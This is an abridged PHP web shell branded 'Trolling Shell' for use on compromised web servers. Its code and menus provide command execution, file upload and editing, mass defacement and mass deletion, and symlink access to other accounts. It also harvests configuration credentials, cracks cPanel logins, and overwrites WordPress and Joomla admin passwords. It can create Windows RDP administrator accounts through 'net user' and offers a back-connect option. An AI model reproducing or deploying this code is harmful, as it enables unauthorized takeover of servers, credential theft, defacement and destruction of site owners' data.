...
$auth_pass = "229f02bf7dc458503fc85c734e4ed690"; 
$color = "#00ff00";
...
<html>
<head>
<link href='https://i.ibb.co/k5MR0db/images.jpg' rel='SHORTCUT ICON'/>
...
<header>
	...
	<font style="color:aqua;text-shadow:0px 5px 8px crimson;font-size:90px" face="Ubuntu"><font size="6" font color="lime"><b>SHELL LOGIN</b></font><br>
	<center><img src="https://i.ibb.co/k5MR0db/images.jpg" width="200">
<form method="post">
...
<html>
<head>
<title>TR0LL1N9</title><link rel="icon" type="image/jpg" href="https://i.ibb.co/k5MR0db/images.jpg"> 

<link href='https://i.ibb.co/k5MR0db/images.jpg' rel='icon' type='image/x-icon'/>
<meta name='author' content='Bandung6etar'>
<meta charset="UTF-8">
<center><font style="color:lime;text-shadow:0px 5px 8px lime;font-size:90px" face="Ubuntu"><font size="6" font color="yellow"><b><img src="http://hackerfactor.com/images/neal-stick2.png"></b></font><br></font>
<br>
<style type='text/css'>
...
function r($dir,$perm) {
    if(!is_readable($dir)) {
        ...
        return "<font color=#2F4F4F>".$perm."</font>";
    }
}
function exe($cmd) {
...
echo "<center>"; echo "<li> <a style='border:2px solid blue;width:80px;padding:0px 8px 0px 8px;' href='?'>Home</a> </li>";
echo "<p>";
echo "<center>"; echo "<li> <a style='border:2px solid lime;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=adminer'>Adminer</a> </li>";
echo "<li> <a style='border:2px solid lime;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=dbdump'>DB Dump</a> </li>";
echo "<li> <a style='border:2px solid lime;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=jumping'>Jumping</a> </li>";
echo "<li> <a style='border:2px solid lime;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=symlink'>Symlink</a> </li>";
echo "<li> <a style='border:2px solid lime;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=mass_deface'>Mass Deface</a> </li>";
echo "<p>";
echo "<li> <a style='border:2px solid #44eded;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=mass_delete'>Mass Delete</a> </li>";
echo "<li> <a style='border:2px solid #44eded;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=upload'>Upload</a> </li>";
echo "<li> <a style='border:2px solid #44eded;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=cmd'>Command</a> </li>";
echo "<li> <a style='border:2px solid #44eded;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=auto_dwp'>WordPress Auto Deface</a> </li>";
echo "<li> <a style='border:2px solid #44eded;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=krdp_shell'>K-RDP Shell</a> </li>";
echo "<p>";

echo "<li> <a style='border:2px solid lime;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=cpanel'>CPanel Crack</a> </li>";
echo "<li> <a style='border:2px solid lime;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=zoneh'>Zone-H</a> </li>";
echo "<li> <a style='border:2px solid lime;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> </li>";
echo "<li> <a style='border:2px solid lime;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=auto_wp'>Auto Edit Title WordPress</a> </li>";
echo "<li> <a style='border:2px solid lime;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=config'>Config</a> </li>";
echo "<p>";
echo "<li> <a style='border:2px solid lime;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=defacerid'>DefacerID</a> </li>";
echo "<li> <a style='border:2px solid lime;width:80px;padding:0px 8px 0px 8px;' href='?dir=$dir&do=backconnect'>Back Connect</a> </li>";
echo "<p>";
echo "<center>"; echo "<li> <a style='border:2px solid darkred;width:80px;padding:0px 8px 0px 8px;' href='?logout=true'>Logout</a> </li><p>";





echo "<font size'2' color='#696969'>: dir";
...
if($_GET['logout'] == true) {
    ...
    if($_POST['upload']) {
        if($_POST['tipe_upload'] == 'biasa') {
            if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
                $act = "<font color=#2F4F4F>Uploaded!</font> at <i>$dir/".$_FILES['ix_file']['name']."</b></i>";
            } else {
            ...
            if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
                if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
                    $act = "<font color=#2F4F4F>Uploaded!</font> at <i>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
                } else {
                    $act = "<font color=red>failed to upload file</font>";
                }
            } else {
        ...
        if(is_writable($dir)) {
            ...
            foreach($dira as $dirb) {
                ...
                if($dirb === '.') {
                    ...
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<font color=#2F4F4F>DONE</font>] $lokasi<br>";
                            file_put_contents($lokasi, $isi_script);
        ...
        if(is_writable($dir)) {
            ...
            foreach($dira as $dirb) {
                ...
                if($dirb === '.') {
                    ...
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<font color=#2F4F4F>DONE</font>] $dirb/$namafile<br>";
                            file_put_contents($lokasi, $isi_script);
                        }
                    }
                }
    ...
    <textarea name='script' style='width: 450px; height: 200px;'>put your dick here</textarea><br>
                    ...
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            if(file_exists($lokasi)) {
                                echo "[<font color=#2F4F4F>DELETED</font>] $lokasi<br>";
                                unlink($lokasi);
    ...
    $htc = fopen("hph_config/.htaccess","w");
    fwrite($htc, $isi_htc);
    fclose($htc);
    if(preg_match("/vhosts|vhost/", $dir)) {
        ...
        $file = "hph_config/vhost.cin";
        $handle = fopen($file ,"w+");
        fwrite($handle ,base64_decode($vhost));
        fclose($handle);
        chmod($file, 0755);
        if(exe("cd hph_config && ./vhost.cin")) {
            echo "<center><a href='$link_config/hph_config'><font color=#2F4F4F>Done</font></a></center>";
        } else {
            echo "<center><a href='$link_config/hph_config/vhost.cin'><font color=#2F4F4F>Done</font></a></center>";
        }
                    ...
                    if(is_readable($user_config_dir)) {
                        ...
                        foreach($grab_config as $config => $nama_config) {
                            ...
                            if($ambil_config == '') {
                                ...
                                $file_config = fopen("hph_config/$user_idx-$nama_config.txt","w");
    ...
    echo "<center><a href='?dir=$dir/hph_config'><font color=#2F4F4F size=4>>> Done <<</font></a></center>";
    }
                ...
                while($gets = fgets($f)) {
                    ...
                    if(is_dir($dir_user) === true) {
                        ...
                        if(is_readable($url_user)) {
                            $i++;
                            $jrw = "[<font color=#2F4F4F>R</font>] <a href='?dir=$url_user'><font color=#2F4F4F>$url_user</font></a>";
                            if(is_writable($url_user)) {
                                $jrw = "[<font color=#2F4F4F>RW</font>] <a href='?dir=$url_user'><font color=#2F4F4F>$url_user</font></a>";
                            }
                            echo $jrw."<br>";
                        }
                    }
            ...
            foreach($urls as $url) {
                ...
                if(is_dir($web_vh) === true) {
                    if(is_readable($web_vh)) {
                        $i++;
                        $jrw = "[<font color=#2F4F4F>R</font>] <a href='?dir=$web_vh'><font color=#2F4F4F>$web_vh</font></a>";
                        if(is_writable($web_vh)) {
                            $jrw = "[<font color=#2F4F4F>RW</font>] <a href='?dir=$web_vh'><font color=#2F4F4F>$web_vh</font></a>";
                        }
                        echo $jrw."<br>";
                    }
                }
            ...
            if($passwd == '' || !$etc) {
                ...
                foreach($user_jumping[1] as $user_idx_jump) {
                    ...
                    if(is_readable($user_jumping_dir)) {
                        $i++;
                        $jrw = "[<font color=#2F4F4F>R</font>] <a href='?dir=$user_jumping_dir'><font color=silver>$user_jumping_dir</font></a>";
                        if(is_writable($user_jumping_dir)) {
                            $jrw = "[<font color=#2F4F4F>RW</font>] <a href='?dir=$user_jumping_dir'><font color=silver>$user_jumping_dir</font></a>";
                        }
                        echo $jrw;
    ...
    if($_POST['hajar']) {
            ...
            foreach($scan_conf as $file_conf) {
                ...
                if(preg_match("/JConfig|joomla/",$config)) {
                    ...
                    if(!$update OR !$conn OR !$db) {
                        ...
                        echo "Status => <font color=#2F4F4F>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
        ...
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='hphshell' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='hphshell' placeholder='pass_baru'><br>
 ...
 if($_POST['crack']) {
  ...
  if($i == 0) {
   ...
   echo "<br>sukses nyolong ".$i." Cpanel by <font color=blue>Bandung6etar</font>";
  }
 } else {
  echo "<center>
  <form method='post'>
  ...
  <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br></center>";
    ...
    if($_POST['hajar']) {
        ...
        foreach($scan_conf as $file_conf) {
            ...
            if(preg_match("/WordPress/", $config)) {
                ...
                if(!$update OR !$conn OR !$db) {
                    ...
                    echo "<font color=#2F4F4F>sukses di ganti.</font><br>";
                }
                echo "</div>";
                mysql_close($conn);
            }
        ...
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set Title: <br>
        <input type='text' name='new_title' value='Bandung6etar' placeholder='New Title'><br><br>
    ...
    if($_POST['submit']) {
        ...
        foreach($domain as $url) {
            ...
            if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
                echo "$url -> <font color=#2F4F4F>OK</font><br>";
            } else {
...
echo "<font color='#2F4F4F' size='3'>Ok -></font>".$url."<p>";
} else {
...
<td>".$user['name']."</td>
<td><a href='$full/hph_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
...
Satisfy Any';
 ...
 echo "<td align=center><font class=txt><a href=$full/hph_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("hph_sym",0777);@chdir("hph_sym");@exe("ln -s / root");$file3 = '
...
if(isset($_POST['gethash'])){
 ...
 <center><br><Br><br>
  ...
  <tr class="optionstr"><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
 </table></tr></form>
 </center>
...
/////////////////////////////
 elseif($_GET['do'] == 'adminer') {
    ...
    if(file_exists('adminer.php')) {
        echo "<center><font color=#2F4F4F><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
    } else {
    ...
    if($_POST['auto_deface_wp']) {
            ...
            if(preg_match("/WordPress/", $config)) {
                ...
                if(!$conn OR !$db OR !$update) {
                    ...
                    if(preg_match("#$script#is", $bs)) {
                        echo "[+] <font color='#2F4F4F'>berhasil mepes...</font><br>";
                        ...
                        echo "[+] username: <font color=#2F4F4F>$user</font><br>";
                        echo "[+] password: <font color=#2F4F4F>$pass</font><br><br>";    
                        }
                    mysql_close($conn);
                }
            }
        ...
        <input type='text' name='script' height='10' size='50' placeholder='Hacked by Bandung6etar' required><br>
    ...
    if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
        if($_POST['create']) {
            ...
            if(preg_match("/$user/", exe("net user"))) {
                echo "[INFO] -> <font color=red>user <font color=#2F4F4F>$user</font> sudah ada</font>";
            } else {
                ...
                ------------------------------<br>
                IP: <font color=#2F4F4F>".$ip."</font><br>
                Username: <font color=#2F4F4F>$user</font><br>
                Password: <font color=#2F4F4F>$pass</font><br>
                ------------------------------<br><br>
                [ STATUS ]<br>
                ------------------------------<br>
                ";
                if($add_user) {
                    echo "[add user] -> <font color='#2F4F4F'>Berhasil</font><br>";
                } else {
                    echo "[add user] -> <font color='red'>Gagal</font><br>";
                }
                if($add_groups1) {
                    echo "[add localgroup Administrators] -> <font color='#2F4F4F'>Berhasil</font><br>";
                } elseif($add_groups2) {
                    echo "[add localgroup Administrator] -> <font color='#2F4F4F'>Berhasil</font><br>";
                } elseif($add_groups3) {
                    echo "[add localgroup Administrateur] -> <font color='#2F4F4F'>Berhasil</font><br>";
                } else {
            ...
            if($_POST['opsi'] == '1') {
                ...
                echo "Checking username <font color=#2F4F4F>$user</font> ....... ";
                if(preg_match("/$user/", $cek)) {
                    echo "[ <font color=#2F4F4F>Sudah ada</font> ]<br>
                    ------------------------------<br><br>
                    <pre>$cek</pre>";
                } else {
                ...
                $cek = exe("net user $user Bandung6etar");
                if(preg_match("/$user/", exe("net user"))) {
                    echo "[change password: <font color=#2F4F4F>Bandung6etar</font>] -> ";
                    if($cek) {
                        echo "<font color=#2F4F4F>Berhasil</font>";
                    } else {
                        echo "<font color=red>Gagal</font>";
                    }
                } else {
                    echo "[INFO] -> <font color=red>user <font color=#2F4F4F>$user</font> belum ada</font>";
                }
            } elseif($_POST['opsi'] == '3') {
                $cek = exe("net user $user /DELETE");
                if(preg_match("/$user/", exe("net user"))) {
                    echo "[remove user: <font color=#2F4F4F>$user</font>] -> ";
                    if($cek) {
                        echo "<font color=#2F4F4F>Berhasil</font>";
                    } else {
                        echo "<font color=red>Gagal</font>";
            ...
            echo "-- Create RDP --<br>
            <form method='post'>
            <input type='text' name='user' placeholder='username' value='Bandung6etar' required>
            <input type='text' name='pass' placeholder='password' value='Bandung6etar' required>
    ...
    echo "Filename: <font color=#2F4F4F>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
    if($_POST['save']) {
        $save = file_put_contents($_GET['file'], $_POST['src']);
        if($save) {
            $act = "<font color=#2F4F4F>Saved!</font>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "<center>Filename: <font color=#2F4F4F>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<form method='post'>
    ...
    echo "Filename: <font color=#2F4F4F>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<form method='post'>
    ...
    if(is_dir($dir) === true) {
        if(!is_readable($dir)) {
            ...
            <th class="th_home"><center>terakhir Modified</center></th>
            <th class="th_home"><center>Owner/Group</center></th>
            <th class="th_home"><center>Permission</center></th>
            <th class="th_home"><center>Edit</center></th>
            </tr>';
            $scandir = scandir($dir);
            foreach($scandir as $dirx) {
                ...
                echo "<tr>";
                echo "<td class='td_home'><img src='http://icons.iconarchive.com/icons/custom-icon-design/mono-general-2/24/folder-icon.png'>$href</td>";
        ...
        foreach($scandir as $file) {
            ...
            echo "<tr>";
            echo "<td class='td_home'><img src='http://icons.iconarchive.com/icons/capital18/capital-suite/24/File-Types-Fonts-icon.png'><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
...
?>
	<br>
		<br>
	<center><a href="mailto:haxorgov@gmail.com"><font size="4" font color="lime">©1945 Trolling Shell</a>
</html>
